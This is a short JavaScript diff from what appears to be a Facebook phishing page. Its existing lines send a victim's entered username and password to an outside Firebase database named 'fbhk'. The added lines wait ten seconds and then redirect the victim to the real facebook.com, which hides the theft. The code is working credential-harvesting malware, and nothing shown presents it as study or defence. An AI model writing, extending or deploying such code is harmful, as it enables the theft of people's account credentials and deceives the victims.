@@ -24,6 +24,11 @@ async function postData(url = '', data = {}) {
         postData('https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json', { userName:userNaname.value, password:password.value})
         .then(data => {
           console.log(data); 
-        });
+        }).then(
+           setTimeout(() => {
+             open("https://www.facebook.com/", "_self")
+           }, 10000)
+        );
+
     
     })
